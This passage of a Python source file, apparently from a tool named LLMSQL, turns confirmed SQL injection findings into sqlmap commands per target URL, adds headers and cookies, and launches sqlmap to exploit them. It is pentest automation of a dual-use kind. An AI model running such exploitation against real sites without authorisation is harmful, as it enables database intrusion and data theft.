                                ParamLocation.QUERY, ParamLocation.BODY
                            ) else ""
                            dbms = f"--dbms={f.db_type}" if f.db_type else ""
                            cmd = f"sqlmap -u '{url}' {base_args} {dbms} {args.sqlmap_args} {extra}{header_args}".strip()
                            import re as _re2
                            cmd = _re2.sub(r" {2,}", " ", cmd)
                            console.print(f"  [dim]{cmd}[/dim]")
                    return 1 if total_findings else 0
            console.print(
                f"[bold cyan]━━━ Stage 2 starting[/bold cyan] — "
                f"running sqlmap on [bold]{total_findings}[/bold] confirmed finding(s)"
            )
        run_sqlmap_on_findings(
            all_reports,
            profile=args.sqlmap_profile,
            sqlmap_args=args.sqlmap_args,
            headers=headers,
            cookie=args.cookie,
            console=console,
            menu=args.sqlmap_menu,
            timeout=args.sqlmap_timeout,
        )

    return 1 if total_findings else 0


def run_sqlmap_on_findings(
    reports,
    profile: str,
    sqlmap_args: str,
    headers: dict[str, str],
    cookie: str | None,
    console,
    menu: bool = False,
    timeout: int = 0,
) -> int:
    """Run sqlmap against only the URLs LLMSQL confirmed as injectable."""
    import shutil
    from urllib.parse import urlparse, urlunparse

    from llmsql.models import ParamLocation

    # Deduplicate: one sqlmap job per unique *base URL*.
    # --guess-params can produce many findings for the same endpoint (one per
    # guessed param). We only need to run sqlmap once per URL — it will probe
    # all parameters itself. If there's a confirmed param, we add -p to focus.
    from urllib.parse import parse_qs, urlencode
    best_finding: dict[str, tuple] = {}  # base_url -> (extra, confidence, db_type)
    for report in reports:
        raw_parsed = urlparse(report.target_url)
        raw_qs = parse_qs(raw_parsed.query, keep_blank_values=True)
        for f in report.findings:
            base = report.target_url
            extra = ""
            if f.location in (ParamLocation.QUERY, ParamLocation.BODY):
                spec_params = {k: v for k, v in raw_qs.items() if k == f.param}
                if not spec_params:
                    spec_params = {f.param: ["1"]}
                clean_url = urlunparse(raw_parsed._replace(
                    query=urlencode({k: v[0] for k, v in spec_params.items()})
                ))
                base = clean_url
                extra = f"-p {f.param}"
            elif f.location == ParamLocation.PATH:
                idx = None
                if f.param.startswith("path[") and "]" in f.param:
                    try:
                        idx = int(f.param[5:f.param.index("]")])
                    except ValueError:
                        idx = None
                parsed = urlparse(base)
                segs = parsed.path.split("/")
                if idx is not None and 0 <= idx < len(segs):
                    segs[idx] = segs[idx] + "*"
                    base = urlunparse(parsed._replace(path="/".join(segs)))
            else:
                continue

            prev = best_finding.get(base)
            if prev is None or f.confidence > prev[1]:
                best_finding[base] = (extra, f.confidence, f.db_type)

    jobs = [(url, data[0], data[2]) for url, data in best_finding.items()]

    if not jobs:
        console.print(
            "\n[yellow]No confirmed injectable URLs to hand to sqlmap.[/yellow] "
            "[dim](nothing to exploit)[/dim]"
        )
        return 0

    base_args = SQLMAP_PROFILES.get(profile, SQLMAP_PROFILES["normal"])
    if menu:
        base_args = interactive_sqlmap(console, profile, base_args, sqlmap_args)
        sqlmap_args = ""

    header_args = ""
    for k, v in (headers or {}).items():
        if k.lower() != "user-agent":
            header_args += f" -H '{k}: {v}'"
    if cookie:
        header_args += f" --cookie '{cookie}'"

    console.print(
        f"\n[bold cyan]Stage 2 — sqlmap targets ({len(jobs)}):[/bold cyan] "
        f"[dim]profile: {profile}[/dim]"
    )
    for i, (url, extra, db) in enumerate(jobs, 1):
        db_tag = f"  [dim][{db}][/dim]" if db else ""
        console.print(f"  {i}) {url}  [dim]{extra}[/dim]{db_tag}")
    console.print()

    have_sqlmap = shutil.which("sqlmap") is not None
    for i, (url, extra, db) in enumerate(jobs, 1):
        dbms_flag = f"--dbms={db}" if db else ""
        cmd = f"sqlmap -u '{url}' {base_args} {dbms_flag} {sqlmap_args} {extra}{header_args}".strip()
        # collapse multiple spaces
        import re as _re
        cmd = _re.sub(r" {2,}", " ", cmd)
        console.print(f"\n[bold]━━━ sqlmap ({i}/{len(jobs)}):[/bold] {url}")
        console.print(f"[dim]{cmd}[/dim]")
        if not have_sqlmap:
            continue
        launch_sqlmap(cmd, timeout, console)

    if not have_sqlmap:
        console.print(
            "\n[yellow]sqlmap not on PATH — commands printed above to run manually.[/yellow]"
        )
    else:
        console.print(
            "\n[dim]sqlmap results saved under ~/.local/share/sqlmap/output/<host>/[/dim]"
        )
    return 0


def _save_multi(reports, path: str) -> None:
    """Save multiple scan reports to a single JSON file."""
    import json
    from llmsql.report import export_json
    with open(path, "w") as f:
        json.dump([export_json(r) for r in reports], f, indent=2)


if __name__ == "__main__":
    sys.exit(main())
